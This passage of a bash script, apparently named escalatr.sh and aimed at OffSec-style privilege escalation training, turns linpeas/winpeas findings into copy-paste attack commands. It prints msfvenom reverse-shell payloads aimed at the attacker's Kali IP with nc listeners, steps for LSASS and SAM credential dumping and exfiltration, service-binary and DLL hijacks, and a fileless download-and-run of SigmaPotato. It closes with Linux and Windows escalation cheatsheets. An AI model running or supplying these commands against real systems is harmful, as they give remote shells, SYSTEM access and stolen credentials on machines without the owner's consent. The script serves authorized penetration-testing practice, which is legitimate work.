        if [[ -n "${token_privs}" ]]; then
            echo "[ TOKEN PRIVILEGES ]"
            echo "------------------------------------------------------------"
            if echo "${token_privs}" | grep -qi "SeImpersonate"; then
                echo "# SeImpersonate — Potato escalation:"
                echo "# Win10/Server 2016-2019: PrintSpoofer64.exe -i -c cmd.exe"
                echo "# Win8-11/Server 2012-2022: SigmaPotato.exe cmd.exe"
                echo "# Broad fallback: GodPotato-NET4.exe -cmd 'cmd /c whoami'"
                echo "# Missing privs first? FullPowers.exe -c \"cmd.exe /c whoami\" -z"
            fi
            if echo "${token_privs}" | grep -qi "SeAssignPrimaryToken"; then
                echo "# SeAssignPrimaryToken — same Potato chain as SeImpersonate:"
                echo "# Often seen on SERVICE accounts without SeImpersonate — same tools work."
                echo "# PrintSpoofer / SigmaPotato / GodPotato all succeed when either priv is present."
            fi
            if echo "${token_privs}" | grep -qi "SeBackup"; then
                echo "# SeBackup — dump SAM/SYSTEM hive:"
                echo "reg save HKLM\\SAM C:\\Temp\\sam.hive"
                echo "reg save HKLM\\SYSTEM C:\\Temp\\sys.hive"
                echo "# Exfil to Kali then: impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
                echo "# PowerShell alt (no restart needed):"
                echo "Get-Acl -Path HKLM:\\SAM  # confirm access"
            fi
            if echo "${token_privs}" | grep -qi "SeRestore"; then
                echo "# SeRestore — overwrite any file including SYSTEM-owned binaries:"
                echo "# Example: replace a service binary that runs as SYSTEM."
                echo "# Use robocopy /B or python win32file CreateFile with BACKUP_SEMANTICS."
                echo "# Combined with SeBackup: full write access to SAM/SYSTEM/SECURITY hives."
            fi
            if echo "${token_privs}" | grep -qi "SeTakeOwnership"; then
                echo "# SeTakeOwnership — take ownership of any file, then grant yourself write:"
                echo "# Pick a SYSTEM-owned binary that runs elevated (service .exe, scheduled task):"
                echo "takeown /f C:\\Path\\To\\target.exe"
                echo "icacls C:\\Path\\To\\target.exe /grant %USERNAME%:F"
                echo "# Overwrite with payload (manual PE revshell — see MSF-limit banner):"
                echo "copy rev.exe C:\\Path\\To\\target.exe /y"
                echo "# Trigger: restart service / wait for schtask / reboot"
            fi
            if echo "${token_privs}" | grep -qi "SeLoadDriver"; then
                echo "# SeLoadDriver — load a vulnerable signed driver for kernel EoP:"
                echo "# Typical flow: Capcom.sys, dbutil_2_3.sys (CVE-2021-21551), kprocesshacker,"
                echo "# or any driver in https://loldrivers.io/"
                echo "#   1. Drop driver on disk (e.g. C:\\Temp\\dbutil.sys)"
                echo "#   2. Use EoPLoadDriver.exe (tandasat) or a PowerShell loader:"
                echo "#      https://github.com/tandasat/ExploitCapcom / EoPLoadDriver"
                echo "#   3. Exploit the loaded driver's IOCTL to elevate token"
                echo "# *** CRASH RISK *** — drivers can BSOD the target. Use LAST RESORT."
            fi
            if echo "${token_privs}" | grep -qi "SeDebug"; then
                echo "# SeDebug — dump LSASS:"
                echo "# Option A: Task Manager → Details → lsass.exe → Create Dump File"
                echo "# Option B: procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
                echo "# Option C (MiniDumpWriteDump via PowerShell, no procdump needed):"
                echo "#   Get-Process lsass | Out-Minidump (PowerSploit / pypykatz offline parse)"
                echo "# Exfil + parse: impacket-secretsdump -just-dc-ntlm -outputfile hashes -ntds lsass.dmp LOCAL"
                echo "# Or: pypykatz lsa minidump lsass.dmp"
            fi
            if echo "${token_privs}" | grep -qi "SeManageVolume"; then
                echo "# SeManageVolume — writable C:\\Windows\\System32 via SeManageVolumeExploit:"
                echo "# See separate [ SeManageVolumePrivilege ] block below for full recipe."
            fi
            echo ""
        fi

        # Stored credentials → runas
        if grep -qi 'Target:' "$quickwins" 2>/dev/null; then
            echo "[ STORED CREDENTIALS (cmdkey) ]"
            echo "------------------------------------------------------------"
            echo "cmdkey /list"
            echo "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe"
            echo "# OR: RunasCs.exe <USER> <PASS> cmd.exe -b  (bypasses UAC)"
            echo ""
        fi

        # AlwaysInstallElevated
        if grep -qi 'AlwaysInstallElevated' "$quickwins" 2>/dev/null; then
            echo "[ ALWAYS INSTALL ELEVATED ]"
            echo "------------------------------------------------------------"
            echo "# Both HKCU + HKLM must be 1. If so:"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o evil.msi"
            echo "msiexec /quiet /qn /i evil.msi"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # Unquoted service paths
        if grep -qi 'unquoted\|Program Files.*\.exe' "$quickwins" 2>/dev/null; then
            echo "[ UNQUOTED SERVICE PATHS ]"
            echo "------------------------------------------------------------"
            echo "# Example: C:\\Program Files\\Vuln Service\\service.exe"
            echo "# Drop payload at: C:\\Program.exe or C:\\Program Files\\Vuln.exe"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o Program.exe"
            echo "# Upload Program.exe, then restart service:"
            echo "sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>"
            echo "# OR: shutdown /r /t 0  (if no manual restart possible)"
            echo ""
        fi

        # Modifiable service binary
        if grep -qi 'modifiable\|Full Control.*service' "$quickwins" 2>/dev/null; then
            echo "[ MODIFIABLE SERVICE BINARY ]"
            echo "------------------------------------------------------------"
            echo "# Replace the service binary with a reverse shell:"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o shell.exe"
            echo "# Backup original: copy C:\\Path\\To\\service.exe C:\\Temp\\service.bak"
            echo "# Replace: copy shell.exe C:\\Path\\To\\service.exe /y"
            echo "sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # DLL hijacking
        if grep -qi 'NAME NOT FOUND\|DLL.*writable' "$quickwins" 2>/dev/null; then
            echo "[ DLL HIJACKING ]"
            echo "------------------------------------------------------------"
            echo "# Compile a malicious DLL (cross-compile from Kali):"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o missing.dll"
            echo "# OR compile C DLL:"
            echo "x86_64-w64-mingw32-gcc -shared -o missing.dll shell.c"
            echo "# Place in the writable directory where the missing DLL is searched"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # SeManageVolumePrivilege
        if grep -qi 'SeManageVolume' "$quickwins" 2>/dev/null; then
            echo "[ SeManageVolumePrivilege ]"
            echo "------------------------------------------------------------"
            echo "# SeManageVolumeExploit → DLL hijack → SYSTEM:"
            echo "# Download: https://github.com/CsEnox/SeManageVolumeExploit"
            echo "iwr -uri http://<KALI_IP>/SeManageVolumeExploit.exe -OutFile C:\\Temp\\smve.exe"
            echo "# Run exploit — sets Full Control on C:\\Windows\\System32 for current user"
            echo ".\\smve.exe"
            echo "# Then DLL hijack a SYSTEM service — example with tzres.dll:"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o tzres.dll"
            printf '%s\n' "copy tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll"
            echo "# Trigger: run systeminfo (loads tzres.dll)"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # Writable scheduled task binary
        if grep -qi 'schtasks\|scheduled task' "$quickwins" 2>/dev/null; then
            echo "[ SCHEDULED TASK — writable binary ]"
            echo "------------------------------------------------------------"
            echo "# Find scheduled task running as SYSTEM with a writable binary:"
            echo "schtasks /query /fo LIST /v | findstr /i 'Task To Run\\|Run As\\|Status'"
            printf '%s\n' "# Check binary permissions: icacls C:\\path\\to\\task\\binary.exe"
            echo "# If writable (F or M for Users/Everyone):"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o task.exe"
            printf '%s\n' "copy task.exe C:\\path\\to\\task\\binary.exe /y"
            echo "# Wait for task trigger, or force run:"
            echo "schtasks /run /tn '<TASK_NAME>'"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # Registry autoruns
        if grep -qi 'autorun\|CurrentVersion\\Run\|HKLM.*Run\|HKCU.*Run' "$quickwins" 2>/dev/null; then
            echo "[ REGISTRY AUTORUNS — writable binary ]"
            echo "------------------------------------------------------------"
            echo "# Check autorun paths:"
            echo "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            echo "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            echo "# For each writable binary: icacls <PATH>"
            echo "# If writable (F or M for Users):"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o update.exe"
            printf '%s\n' "copy update.exe C:\\path\\to\\autorun\\binary.exe /y"
            echo "# Trigger: wait for logon/reboot, or"
            echo "shutdown /r /t 0"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # AutoLogon DefaultPassword → runas
        if grep -qi 'DefaultPassword\|AutoAdminLogon\|autologon' "$quickwins" 2>/dev/null; then
            echo "[ AUTOLOGON CREDENTIALS ]"
            echo "------------------------------------------------------------"
            echo "# Extract full credentials:"
            echo "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
            echo "# Look for DefaultUserName, DefaultPassword, DefaultDomain"
            echo ""
            echo "# Validate immediately:"
            echo "# Spray the password:"
            echo "${SCRIPT_DIR}/sprayr.sh -u <DefaultUserName> -p '<DefaultPassword>' -t <TARGET_IP>"
            echo ""
            echo "# Use with RunasCs if you can't PTH:"
            echo ".\\RunasCs.exe <DefaultUserName> '<DefaultPassword>' cmd.exe"
            echo ".\\RunasCs.exe <DefaultUserName> '<DefaultPassword>' cmd.exe -b  # UAC bypass"
            echo ""
        fi

        # PowerShell history → check for creds
        if grep -qi 'ConsoleHost_history\|PSReadline\|PSReadLine' "$quickwins" 2>/dev/null; then
            echo "[ POWERSHELL HISTORY ]"
            echo "------------------------------------------------------------"
            echo "# Read full PS history:"
            echo "type \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
            echo ""
            echo "# Grep for credentials:"
            echo "Select-String -Path \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt -Pattern 'pass|secret|cred|token|-p |password'"
            echo ""
            echo "# If plaintext creds found → spray:"
            echo "${SCRIPT_DIR}/sprayr.sh -u <USER> -p '<FOUND_PASS>' -t <TARGET_IP>"
            echo ""
        fi

        # KeePass .kdbx → keepass2john → crackr
        if grep -qi '\.kdbx\|keepass' "$quickwins" 2>/dev/null; then
            echo "[ KEEPASS DATABASE ]"
            echo "------------------------------------------------------------"
            echo "# 1. Find the .kdbx file:"
            echo "Get-ChildItem -Path C:\\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue"
            echo ""
            echo "# 2. Exfil to Kali, then crack master password:"
            echo "${SCRIPT_DIR}/crackr.sh -e keepass -f /tmp/db.kdbx -q"
            echo "# OR: keepass2john db.kdbx > kp.hash && ${SCRIPT_DIR}/crackr.sh -f kp.hash -q"
            echo ""
            echo "# 3. Open database (once cracked):"
            echo "kpcli --kdb db.kdbx  # Kali: sudo apt install kpcli"
            echo ""
        fi

        # GPP Groups.xml / cpassword (MS14-025)
        if grep -qiE 'cpassword|Groups\.xml|Services\.xml|ScheduledTasks\.xml' "$quickwins" 2>/dev/null; then
            echo "[ GPP GROUPS.XML — cpassword (MS14-025) ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: Groups.xml / Services.xml / cpassword found in loot"
            echo "# Microsoft published the AES key in 2012 — any cpassword is trivially decryptable."
            echo "# 1. Extract the cpassword value from the XML:"
            echo "findstr /S /I cpassword C:\\*.xml"
            echo ""
            echo "# 2. On Kali, decrypt with gpp-decrypt:"
            echo "gpp-decrypt '<CPASSWORD_VALUE>'"
            echo ""
            echo "# 3. Validate immediately — these are often local admin creds:"
            echo "${SCRIPT_DIR}/sprayr.sh -u '<USERNAME_FROM_XML>' -p '<DECRYPTED_PASSWORD>' -t <TARGET_IP>"
            echo ""
        fi

        # WSL detection — cross-OS pivot / root on Linux
        if grep -qiE 'wsl|WindowsSubsystemForLinux|LxssManager' "$quickwins" 2>/dev/null; then
            echo "[ WSL — WINDOWS SUBSYSTEM FOR LINUX ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: WSL installed / referenced in enum output"
            echo "# Enumerate installed distros:"
            echo "wsl --list --verbose"
            echo ""
            echo "# If a distro is installed, jump into it as root (no password needed):"
            echo "wsl -u root -- /bin/bash"
            echo "# From inside WSL, the Windows drives are at /mnt/c, /mnt/d, etc."
            echo "# Note: root inside WSL != SYSTEM on Windows."
            echo "# But: any credentials, SSH keys, .bash_history inside the distro root are yours."
            echo ""
            echo "# WSL 1 — raw access to the distro filesystem (if you have local filesystem write):"
            echo "# C:\\Users\\<USER>\\AppData\\Local\\Packages\\<DistroPkg>\\LocalState\\rootfs\\"
            echo ""
            echo "# If WSL is running a sshd, you may pivot through it with ssh keys from /root or /home:"
            echo "wsl -u root -- cat /root/.ssh/id_rsa 2>/dev/null"
            echo "wsl -u root -- cat /root/.ssh/authorized_keys 2>/dev/null"
            echo ""
        fi

        # Internal listeners
        local win_internal
        win_internal=$(grep -oP '127\.0\.0\.1:\K[0-9]+' "$quickwins" 2>/dev/null | sort -u)
        if [[ -n "${win_internal}" ]]; then
            echo "[ INTERNAL LISTENERS — tunnel from Kali ]"
            echo "------------------------------------------------------------"
            while IFS= read -r port; do
                [[ -z "${port}" ]] && continue
                echo "# Port ${port}:"
                echo "# Upload chisel to target, then:"
                echo "# Kali:   ./chisel server -p 8888 --reverse"
                echo "# Target: chisel.exe client <KALI_IP>:8888 R:${port}:127.0.0.1:${port}"
                echo "# OR SSH tunnel (if SSH available):"
                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<TARGET_IP>"
            done <<< "${win_internal}"
            echo ""
        fi

        echo "============================================================"
    } > "${acfile}"

    # Resolve known values — no placeholders in copy-paste commands
    sed -i "s/<KALI_IP>/${kali_ip}/g" "${acfile}" 2>/dev/null
    [[ -n "${target_ip}" ]] && sed -i "s/<TARGET_IP>/${target_ip}/g" "${acfile}" 2>/dev/null
    cp "${acfile}" "${output_dir}/next_steps.txt" 2>/dev/null || true

    success "Attack commands → ${acfile}"
    success "Next steps alias → ${output_dir}/next_steps.txt"
    warn "cat ${output_dir}/next_steps.txt  # ← START HERE for exploitation"
}

#==============================================================================
# COMMAND CHEATSHEET: Print inline decision-tree cheatsheet
#==============================================================================
print_cheatsheet() {
    local os_type="$1"

    if [[ "$os_type" == "linux" ]]; then
        header "LINUX PRIVESC DECISION TREE"
        cat << 'EOF'

  ┌─ sudo -l ──────────────────────────────────────────────┐
  │  NOPASSWD: /bin/X    → GTFOBins                       │
  │  env_keep+=LD_PRELOAD → compile .so, sudo LD_PRELOAD  │
  │  (user2) NOPASSWD    → lateral pivot then escalate     │
  │  !root + sudo <1.8.28 → sudo -u#-1 /bin/bash          │
  └────────────────────────────────────────────────────────┘
  ┌─ SUID ─────────────────────────────────────────────────┐
  │  find / -perm -4000 → GTFOBins                        │
  │  Custom binary? → strace, ltrace, strings             │
  └────────────────────────────────────────────────────────┘
  ┌─ Capabilities ─────────────────────────────────────────┐
  │  cap_setuid+ep on interpreter → setuid(0) + exec sh   │
  │  cap_dac_read_search → read /etc/shadow, SSH keys     │
  └────────────────────────────────────────────────────────┘
  ┌─ Cron ─────────────────────────────────────────────────┐
  │  Writable script?     → inject revshell               │
  │  Wildcard (tar *)?    → --checkpoint injection         │
  │  No absolute path?    → PATH hijack                   │
  │  Use pspy to catch hidden cron!                       │
  │  Check ALL: /etc/crontab, /etc/cron.d/,               │
  │    /var/spool/cron/, systemctl list-timers             │
  └────────────────────────────────────────────────────────┘
  ┌─ Files ────────────────────────────────────────────────┐
  │  Writable /etc/passwd  → add UID 0 user               │
  │  Readable /etc/shadow  → crack offline                 │
  │  Writable sudoers      → grant sudo ALL                │
  │  Writable systemd unit → inject ExecStart + reload     │
  └────────────────────────────────────────────────────────┘
  ┌─ Shared Object / Library ──────────────────────────────┐
  │  SUID binary loads .so from writable dir → hijack      │
  │  sudo env_keep+=LD_LIBRARY_PATH → library hijack       │
  │  Python lib hijack (root script imports writable .py)  │
  └────────────────────────────────────────────────────────┘
  ┌─ Groups ───────────────────────────────────────────────┐
  │  docker → mount host fs    lxd → privileged container  │
  │  disk   → debugfs          adm → read logs for creds   │
  └────────────────────────────────────────────────────────┘
  ┌─ NFS ──────────────────────────────────────────────────┐
  │  no_root_squash → mount + SUID binary from Kali        │
  └────────────────────────────────────────────────────────┘
  ┌─ Kernel (LAST RESORT) ────────────────────────────────┐
  │  DirtyPipe, PwnKit, DirtyCow, Baron Samedit           │
  │  uname -r → les.sh or searchsploit                    │
  └────────────────────────────────────────────────────────┘

EOF

    elif [[ "$os_type" == "windows" ]]; then
        header "WINDOWS PRIVESC DECISION TREE"
        cat << 'EOF'

  ┌─ Token Privileges (whoami /priv) ─────────────────────┐
  │  SeImpersonate  → PrintSpoofer / SigmaPotato /        │
  │                   GodPotato (pick by OS version!)      │
  │    Win10/Srv2016-2019: PrintSpoofer64.exe              │
  │    Win8-11/Srv2012-2022: SigmaPotato.exe               │
  │    Broad fallback: GodPotato-NET4.exe                  │
  │    Missing privs? FullPowers.exe first!                │
  │  SeAssignPrimaryToken → same Potato chain as above     │
  │  SeBackup       → reg save SAM/SYSTEM → secretsdump   │
  │  SeRestore      → overwrite SYSTEM-owned files         │
  │  SeTakeOwnership → takeown + icacls → replace service  │
  │  SeDebug        → procdump lsass → pypykatz offline    │
  │  SeManageVolume → SeManageVolumeExploit → DLL hijack   │
  │  SeLoadDriver   → vuln signed driver (loldrivers.io)   │
  │                   *** CRASH RISK — last resort ***     │
  └────────────────────────────────────────────────────────┘
  ┌─ Stored Creds ─────────────────────────────────────────┐
  │  cmdkey /list → runas /savecred /user:X cmd.exe        │
  │  PS history → ConsoleHost_history.txt                  │
  │  web.config, *.ini, *.xml, *.kdbx                     │
  │  GPP Groups.xml cpassword (MS14-025) → gpp-decrypt     │
  └────────────────────────────────────────────────────────┘
  ┌─ WSL (if present) ─────────────────────────────────────┐
  │  wsl --list → wsl -u root -- /bin/bash                 │
  │  Check /root/.ssh/ and /home/*/.ssh for pivot keys     │
  │  Note: root in WSL ≠ SYSTEM on Windows                 │
  └────────────────────────────────────────────────────────┘
  ┌─ Service Misconfig ────────────────────────────────────┐
  │  Writable binary (icacls: F/M)  → replace + restart   │
  │  Unquoted path + spaces         → drop in gap         │
  │  Weak ACL (Get-ModifiableService) → sc config binpath │
  │  DLL search order (ProcMon)     → plant missing DLL   │
  │  Writable dir in PATH           → DLL search hijack   │
  └────────────────────────────────────────────────────────┘
  ┌─ Scheduled Tasks ──────────────────────────────────────┐
  │  Writable task binary as SYSTEM → replace + wait       │
  └────────────────────────────────────────────────────────┘
  ┌─ AlwaysInstallElevated ────────────────────────────────┐
  │  HKCU + HKLM both = 1 → msfvenom MSI → SYSTEM         │
  └────────────────────────────────────────────────────────┘
  ┌─ Registry Autoruns ────────────────────────────────────┐
  │  HKLM\...\Run → writable binary? → replace + reboot   │
  └────────────────────────────────────────────────────────┘
  ┌─ UAC Bypass (admin group, medium integrity) ──────────┐
  │  fodhelper.exe → reg add ms-settings → execute         │
  │  RunasCs.exe user pass cmd -b (bypass UAC)             │
  └────────────────────────────────────────────────────────┘
  ┌─ Kernel (LAST RESORT) ────────────────────────────────┐
  │  systeminfo → windows-exploit-suggester                │
  └────────────────────────────────────────────────────────┘

EOF
    fi
}

#==============================================================================
# OS DETECTION (lightweight — checks common ports)
#==============================================================================
detect_os() {
    local target_ip="$1"
    info "Attempting OS detection for $target_ip..." >&2

    # Quick port check — if 135/445 open, likely Windows; if 22 open, likely Linux
    local win_ports="" linux_ports=""
    # shellcheck disable=SC2016
    win_ports=$(timeout 5 bash -c 'echo "" > "/dev/tcp/$1/445" 2>/dev/null && echo "open"' -- "$target_ip" 2>/dev/null || true)
    # shellcheck disable=SC2016
    linux_ports=$(timeout 5 bash -c 'echo "" > "/dev/tcp/$1/22" 2>/dev/null && echo "open"' -- "$target_ip" 2>/dev/null || true)

    if [[ "$win_ports" == "open" ]]; then
        success "Port 445 open → likely Windows" >&2
        echo "windows"
    elif [[ "$linux_ports" == "open" ]]; then
        success "Port 22 open → likely Linux" >&2
        echo "linux"
    else
        local nmap_os=""
        if [[ $EUID -eq 0 ]]; then
            nmap_os=$(timeout 15 nmap -O --osscan-guess -T4 "$target_ip" 2>/dev/null | grep -i "OS details\|Running:" | head -1)
        else
            warn "nmap OS detection skipped in non-root mode" >&2
        fi
        if echo "$nmap_os" | grep -qi "windows"; then
            success "nmap OS detect → Windows" >&2
            echo "windows"
        elif echo "$nmap_os" | grep -qi "linux"; then
            success "nmap OS detect → Linux" >&2
            echo "linux"
        else
            warn "Could not detect OS — specify with --os linux|windows" >&2
            echo ""
        fi
    fi
}

#==============================================================================
# POTATO DECISION HELPER
#==============================================================================
print_potato_guide() {
    header "POTATO VARIANT SELECTION GUIDE"
    cat << 'EOF'

  SeImpersonatePrivilege detected — which potato to use?

  ┌────────────────────┬─────────────────────────────────────┐
  │ OS Version         │ Recommended Tool                    │
  ├────────────────────┼─────────────────────────────────────┤
  │ Win 7/Srv 2008     │ JuicyPotato (need CLSID)            │
  │ Win 8.1/Srv 2012   │ JuicyPotato or SigmaPotato          │
  │ Win 10/Srv 2016    │ PrintSpoofer or SigmaPotato          │
  │ Win 10 1809+       │ PrintSpoofer / SigmaPotato (NOT JP) │
  │ Win Srv 2019       │ PrintSpoofer / SigmaPotato           │
  │ Win 11/Srv 2022    │ SigmaPotato or GodPotato            │
  │ Any (broad compat) │ GodPotato-NET4.exe                  │
  └────────────────────┴─────────────────────────────────────┘

  If PrintSpoofer fails silently → Print Spooler disabled (post-PrintNightmare)
  → Fall back to GodPotato or SigmaPotato

  If GodPotato fails → check .NET version on target
  → Try GodPotato-NET2.exe for older .NET

  If SeImpersonate MISSING on Local/Network Service accounts:
  → FullPowers.exe -c "cmd /c whoami /priv" -z
  → Then re-run potato with recovered privileges

  SigmaPotato extras:
  → --revshell <ip> <port>         (built-in reverse shell)
  → .NET reflection (fileless):
    [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://KALI/SigmaPotato.exe"))
    [SigmaPotato]::Main("cmd /c whoami")

EOF
}

#==============================================================================
# MAIN
#==============================================================================
usage() {
    cat << EOF
${BOLD}ESCALATR.SH${NC} — OffSec Privilege Escalation Enumeration Orchestrator

${BOLD}USAGE:${NC}
  ./escalatr.sh <TARGET_IP> [OPTIONS]
  ./escalatr.sh --parse <output_file> [--os linux|windows]
  ./escalatr.sh --commands linux|windows
  ./escalatr.sh --potato

${BOLD}OPTIONS:${NC}
  --os linux|windows     Specify target OS (skip auto-detection)
  --serve                Stage tools and start HTTP server only
  --parse <file>         Parse linpeas/winpeas output for quick-wins
  --commands linux|windows   Print privesc command cheatsheet
  --potato               Print potato variant selection guide
  --no-stage             Skip tool download/staging
  --offline              Use cached tools only — no network fetch
  --port <N>             HTTP server port (default: $HTTP_PORT)
  --remote-tmp <path>    Writable dir on target (default: /tmp; use if /tmp is noexec)
  --no-color             Disable ANSI colors (also via NO_COLOR=1 env)
  -h, --help             Show this help

${BOLD}EXAMPLES:${NC}
  ./escalatr.sh 192.168.50.100 --os linux
  ./escalatr.sh 192.168.50.100 --os windows --port 9999
  ./escalatr.sh --parse /tmp/linpeas_output.txt --os linux
  ./escalatr.sh --commands windows
  ./escalatr.sh --serve 192.168.50.100 --os linux
  ./escalatr.sh 192.168.50.100 --os linux --offline   # cached tools only

${BOLD}NOTE:${NC} This script is ENUMERATION ONLY — no auto-exploitation.
${BOLD}OffSec:${NC} Metasploit usage is limited to 1 target across the engagement.
      Windows attack_commands.txt includes a MSF-limit banner + manual
      (mingw32-gcc / nishang / powercat) alternatives where feasible.
EOF
}

main() {
    local target_ip=""
    local target_os=""
    local parse_file=""
    local serve_only=false
    local commands_only=false
    local no_stage=false
    local show_potato=false

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --os)
                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
                if ! target_os=$(normalize_os "$2"); then
                    error "Invalid OS: $2 (use linux or windows)"
                    exit 1
                fi
                shift 2
                ;;
            --serve)
                serve_only=true
                shift
                ;;
            --parse)
                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
                parse_file="$2"
                shift 2
                ;;
            --commands)
                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
                commands_only=true
                if ! target_os=$(normalize_os "$2"); then
                    error "Invalid OS for --commands: $2 (use linux or windows)"
                    exit 1
                fi
                shift 2
                ;;
            --potato)
                show_potato=true
                shift
                ;;
            --no-stage)
                no_stage=true
                shift
                ;;
            --offline)
                OFFLINE_MODE=true
                shift
                ;;
            --remote-tmp)
                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
                REMOTE_TMP="$2"
                shift 2
                ;;
            --port)
                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
                HTTP_PORT="$2"
                shift 2
                ;;
            --no-color)
                disable_colors
                shift
                ;;
            -h|--help|help)
                usage
                exit 0
                ;;
            -*)
                error "Unknown option: $1"
                usage
                exit 1
                ;;
            *)
                if [[ -z "$target_ip" ]]; then
                    if ! is_valid_ip "$1"; then
                        error "Invalid target IP: $1 (expected IPv4 address)"
                        exit 1
                    fi
                    target_ip="$1"
                fi
                shift
                ;;
        esac
    done

    # Handle --potato
    if [[ "$show_potato" == true ]]; then
        print_potato_guide
        exit 0
    fi

    # Handle --commands
    if [[ "$commands_only" == true ]]; then
        print_cheatsheet "$target_os"
        exit 0
    fi

    # Handle --parse
    if [[ -n "$parse_file" ]]; then
        if [[ ! -f "$parse_file" ]]; then
            error "File not found: $parse_file"
            exit 1
        fi
        local parse_dir=""
        parse_dir="$PRIVESC_DIR/parsed_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$parse_dir"

        # Auto-detect OS from file content if not specified
        if [[ -z "$target_os" ]]; then
            if grep -qi "linux\|linpeas\|/etc/passwd\|uname" "$parse_file"; then
                target_os="linux"
            elif grep -qi "windows\|winpeas\|whoami /priv\|systeminfo" "$parse_file"; then
                target_os="windows"
            else
                error "Cannot auto-detect OS from file. Use --os linux|windows"
                exit 1
            fi
            info "Auto-detected OS: $target_os"
        fi

        if [[ "$target_os" == "linux" ]]; then
            parse_linux_output "$parse_file" "$parse_dir" "${target_ip:-}"
        else
            parse_windows_output "$parse_file" "$parse_dir" "${target_ip:-}"
        fi
        exit 0
    fi

    # Need a target IP for remaining modes
    if [[ -z "$target_ip" ]]; then
        error "No target IP specified"
        usage
        exit 1
    fi

    if ! is_valid_target "$target_ip"; then
        error "Invalid target: $target_ip"
        exit 1
    fi

    if ! is_valid_port "$HTTP_PORT"; then
        error "Invalid HTTP port: $HTTP_PORT (use 1-65535)"
        exit 1
    fi

    header "ESCALATR — Privilege Escalation Enumeration"
    info "Target: $target_ip"

    # --- Connectivity pre-flight ---
    local kali_ip_check=""
    kali_ip_check=$(get_kali_ip)
    info "Kali IP: $kali_ip_check"

    # VPN check
    if ip link show tun0 &>/dev/null; then
        success "VPN up (tun0 detected)"
    else
        warn "No VPN detected (tun0 not found)"
        warn "If this is the engagement, check your VPN connection!"
    fi

    # Kali IP sanity check
    if [[ "$kali_ip_check" == "YOUR_KALI_IP" ]]; then
        warn "Could not detect Kali IP — transfer commands will show placeholder"
        warn "Check: ip a (is tun0 or eth0 up?)"
    fi

    # Target reachability
    # shellcheck disable=SC2016
    if ping -c 1 -W 2 "$target_ip" &>/dev/null; then
        success "Target $target_ip is reachable"
    elif timeout 3 bash -c 'echo "" > "/dev/tcp/$1/445" 2>/dev/null || echo "" > "/dev/tcp/$1/22" 2>/dev/null || echo "" > "/dev/tcp/$1/80" 2>/dev/null' -- "$target_ip" 2>/dev/null; then
        success "Target $target_ip is reachable (ICMP blocked, but TCP responding)"
    else
        warn "Target $target_ip is NOT responding to ping or common ports"
        warn "Check: Is the target up? Is your VPN connected?"
    fi
    echo ""

    # Detect OS if not specified
    if [[ -z "$target_os" ]]; then
        target_os=$(detect_os "$target_ip")
        if [[ -z "$target_os" ]]; then
            error "Could not detect OS. Use --os linux|windows"
            exit 1
        fi
    fi
    info "Target OS: $target_os"

    # Set up output directory
    local target_dir="$PRIVESC_DIR/$target_ip"
    mkdir -p "$target_dir"/{tools,raw}
    progress_log "$target_dir" "START" "escalatr" "target=$target_ip os=$target_os"

    # Stage tools
    if [[ "$no_stage" != true ]]; then
        if stage_tools "$target_os" "$target_dir"; then
            progress_log "$target_dir" "DONE" "tool_staging" "$target_os"
        else
            progress_log "$target_dir" "FAIL" "tool_staging" "$target_os"
        fi
    fi

    # Generate commands
    local cmd_gen_ok=true
    if [[ "$target_os" == "linux" ]]; then
        generate_linux_commands "$target_ip" "$target_dir" || cmd_gen_ok=false
    else
        generate_windows_commands "$target_ip" "$target_dir" || cmd_gen_ok=false
    fi
    if [[ "$cmd_gen_ok" == "true" ]]; then
        progress_log "$target_dir" "DONE" "command_gen" "$target_os"
    else
        progress_log "$target_dir" "FAIL" "command_gen" "$target_os"
    fi

    # Print cheatsheet
    print_cheatsheet "$target_os"

    # Serve tools
    local serve_ok=true
    if [[ "$serve_only" == true ]] || [[ "$no_stage" != true ]]; then
        serve_tools "$target_dir/tools" || serve_ok=false
    fi

    echo ""
    success "Output directory: $target_dir"
    success "Commands file:    $target_dir/commands.txt"

    local _kali_ip_final
    _kali_ip_final=$(get_kali_ip)

